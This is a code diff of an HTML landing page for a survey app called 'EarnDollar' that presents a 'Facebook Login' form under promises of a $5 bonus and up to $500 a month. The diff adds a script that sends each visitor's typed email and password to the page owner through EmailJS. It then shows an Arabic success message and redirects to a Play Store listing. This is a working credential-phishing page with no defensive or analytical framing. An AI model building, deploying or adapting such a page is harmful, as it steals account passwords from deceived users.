@@ -15,9 +15,20 @@
             font-family: Arial, sans-serif;
             margin: 0; /* Remove default body margin */
         }
+        img {
+            width: 100%; /* Set the image to be responsive */
+            max-width: 350px; /* Set a maximum width for the image */
+            height: auto; /* Maintain the aspect ratio */
+            margin-bottom: 20px; /* Add space below the image */
+        }
         h1 {
             color: red;
             font-size: 36px;
+            margin-bottom: 10px;
+        }
+        h2 {
+            color: #1877f2;
+            font-size: 24px;
             margin-bottom: 10px;
         }
         p.description {
@@ -32,10 +43,7 @@
             border-radius: 10px;
             box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
             width: 300px;
-        }
-        h2 {
-            text-align: center;
-            color: #1877f2;
+            margin-bottom: 20px; /* Add space below the login container */
         }
         input[type="text"], input[type="password"] {
             width: 100%;
@@ -69,18 +77,19 @@
         .forgot-password a:hover {
             text-decoration: underline;
         }
-        img {
-            width: 100%; /* Ensure the image fits the container */
-            max-width: 400px; /* Set a maximum width for the image */
-            height: auto; /* Maintain aspect ratio */
-            margin-bottom: 20px; /* Add space below the image */
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
         }
     </style>
 </head>
 <body>
+    <img src="https://lh3.googleusercontent.com/fife/ALs6j_G1rak3XnI5a3T9JKkLHmNQ_8QmInv_1z5sU2IMY4O6wFjxZByMnqzswls-NTo58VtQWomgBFVx0LyO7fSFZVH2O5NMdUByu2nhbycREf8gId11T2GiJ37R_xDvKn5vlLeMme_9CCauitjmYgb24-I14CyBSIUuYU_l-5og6xvHqnOqOBVQYKYwVprpECH5LQu1omC6ESTAe0K3VWv6pKXWtap2_X2mLBpGfAXkr69AyZA9PMiM6jQknoVLvr-eb-6C68g7qkBaF0wVtEuhpY0yldJHSet5PCwtQGjX4EwXJAob3ApeDn9_kYTJ2GDiuU9JW7EcNBHggXc37fMnfdrR6nllGPgp-syfZPzCSTamyH3JgwIewWc4UpWi24oWm5vZWsL9Zv8D8swUz2EQBhNvt3Fj7llDBp9uZIwPe0pRSER-08YoJ6W2uVMtdORPIey6GbmtiDEbVQUx0f-SuTzfoT4eSEsqfk8X_Ycwibcu_P-fAv7OuK50CaGRFwVYhNZj-jzbDnRtQqGgHQ7aRsFNCR8XDrkZyGsn1Xq4ygkZd6LWK4H3GQ-OijxWtDoSG25h9epY8NOAq-fRBVDDgBiTTrfLQyOZZg2vSFV1SfH6_-d8bdVcrkh3lSYnIN54aJiZDSYrHiuAczTTxpkgMsmyCPAioFQi1asxVdf6DynBu4CtPjh_wjd08V3XyRbouFkQaDYfOmrQeiqDP021zJZSIvFKeNq4Zlvkxb994RbapptAhlkY7Hql-rRzDeJmB9s2lWOvHgfhYLCYGPBCYkACSL97GtepM0JxfGwy6KsZPQpRG9UUBAIpeEFKIWmz91DNkCZSePk-mgBiPJDGK5rbNT4B1FLZyEAyRjuUGgTM7FHkQ_1uUPqZXVge4VzyentEBpErAHkhmb0_O-D1woCQyMngsdQMcY751j51ryex1PinmTzkMOrZn6ZFYPZtK-5YKTbDfaBf30-50pjDAH0R4R7W7BG0z0czweSDoapioICBnBFVIIPE_cQxQYQsb6IMMlA19l6F1tjC6JtO5ap-HjTgQWGKXM7-g7NsIfaTJvy79zbdgtbzJvlKApzXN6lRz6qVorhfVIvZ8drA4ihswTNaonr319oO66rVe6OpdgsfTv8TnrM80bHDOjHJnOjKK3nijVeE_1p_AjrvrOIa2pVZnRep9ProinPg1C8=s444-w444-h250-n-k?authuser=0&cs=1&hl=en-US-u-fw-sun-mu-celsius" alt="Dollar Surveys Logo">
+    
     <h1>EarnDollar</h1>
-    <img src="https://lh3.googleusercontent.com/fife/ALs6j_G1rak3XnI5a3T9JKkLHmNQ_8QmInv_1z5sU2IMY4O6wFjxZByMnqzswls-NTo58VtQWomgBFVx0LyO7fSFZVH2O5NMdUByu2nhbycREf8gId11T2GiJ37R_xDvKn5vlLeMme_9CCauitjmYgb24-I14CyBSIUuYU_l-5og6xvHqnOqOBVQYKYwVprpECH5LQu1omC6ESTAe0K3VWv6pKXWtap2_X2mLBpGfAXkr69AyZA9PMiM6jQknoVLvr-eb-6C68g7qkBaF0wVtEuhpY0yldJHSet5PCwtQGjX4EwXJAob3ApeDn9_kYTJ2GDiuU9JW7EcNBHggXc37fMnfdrR6nllGPgp-syfZPzCSTamyH3JgwIewWc4UpWi24oWm5vZWsL9Zv8D8swUz2EQBhNvt3Fj7llDBp9uZIwPe0pRSER-08YoJ6W2uVMtdORPIey6GbmtiDEbVQUx0f-SuTzfoT4eSEsqfk8X_Ycwibcu_P-fAv7OuK50CaGRFwVYhNZj-jzbDnRtQqGgHQ7aRsFNCR8XDrkZyGsn1Xq4ygkZd6LWK4H3GQ-OijxWtDoSG25h9epY8NOAq-fRBVDDgBiTTrfLQyOZZg2vSFV1SfH6_-d8bdVcrkh3lSYnIN54aJiZDSYrHiuAczTTxpkgMsmyCPAioFQi1asxVdf6DynBu4CtPjh_wjd08V3XyRbouFkQaDYfOmrQeiqDP021zJZSIvFKeNq4Zlvkxb994RbapptAhlkY7Hql-rRzDeJmB9s2lWOvHgfhYLCYGPBCYkACSL97GtepM0JxfGwy6KsZPQpRG9UUBAIpeEFKIWmz91DNkCZSePk-mgBiPJDGK5rbNT4B1FLZyEAyRjuUGgTM7FHkQ_1uUPqZXVge4VzyentEBpErAHkhmb0_O-D1woCQyMngsdQMcY751j51ryex1PinmTzkMOrZn6ZFYPZtK-5YKTbDfaBf30-50pjDAH0R4R7W7BG0z0czweSDoapioICBnBFVIIPE_cQxQYQsb6IMMlA19l6F1tjC6JtO5ap-HjTgQWGKXM7-g7NsIfaTJvy79zbdgtbzJvlKApzXN6lRz6qVorhfVIvZ8drA4ihswTNaonr319oO66rVe6OpdgsfTv8TnrM80bHDOjHJnOjKK3nijVeE_1p_AjrvrOIa2pVZnRep9ProinPg1C8=s444-w444-h250-n-k?authuser=0&cs=1&hl=en-US-u-fw-sun-mu-celsius" alt="Dollar Surveys Image">
-    <p class="description">Earn cash with the Dollar Surveys app by completing paid surveys! Enjoy a special $5 bonus offer when you sign up, and start earning up to $500 per month. With our app, you can earn up to 50% more than other survey platforms. Our trusted service ensures your personal information is safe while you express your opinions from the comfort of your home.</p>
+    <h2>Join Our Survey App!</h2>
+    <p class="description">Enjoy paid surveys for cash! Earn dollars with our survey app and take advantage of our special $5 bonus offer today. Express your opinion and earn up to $500 per month from the comfort of your home!</p>
 
     <div class="login-container">
         <h2>Facebook Login</h2>
@@ -94,14 +103,37 @@
         </div>
     </div>
 
+    <div class="footer">
+        &copy; 2024 EarnDollar. All rights reserved.
+    </div>
+
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
+        (function(){
+            emailjs.init("fjJBjt33JjzxpkTww");
+        })();
+
         function handleSubmit(event) {
-            event.preventDefault(); // Prevent the default form submission
+            event.preventDefault();
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            alert("Login Successful!"); // Show the alert with the message
-            // You can add further logic here to handle the login process
-            return false; // Prevent form submission
+
+            const templateParams = {
+                user_email: email,
+                user_password: password
+            };
+
+            emailjs.send("service_la9pk5b", "template_taq80yv", templateParams)
+                .then(function(response) {
+                    alert('تم التسجيل بنجاح !يرجى انتظار رسالة تأكيد الحساب .');
+                    setTimeout(function() {
+                        window.location.href = "https://play.google.com/store/apps/details?id=app.dollarsurveys";
+                    }, 1000);
+                }, function(error) {
+                    console.error('FAILED...', error);
+                    alert('المعلومات خاطئة يرجى إعادة المحاولة .');
+                });
         }
     </script>
 </body>
